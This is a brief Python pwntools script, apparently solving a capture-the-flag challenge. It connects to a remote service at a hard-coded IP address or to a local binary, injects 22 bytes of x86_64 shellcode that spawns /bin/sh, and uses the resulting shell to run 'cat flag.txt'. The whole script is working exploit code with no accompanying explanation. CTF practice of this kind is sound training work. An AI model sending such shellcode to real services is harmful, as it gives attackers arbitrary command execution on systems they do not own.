from pwn import *

context.log_level = "critical"

REMOTE = True

if REMOTE:
    io = remote("18.215.144.52", 1025)
else:
    io = process("./challenge")

# 22 bytes shellcode (x86_64)
shellcode = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"

io.send(shellcode)
io.sendline(b"cat flag.txt")
print(f"Flag: {io.recvlineS()}")

# io.interactive()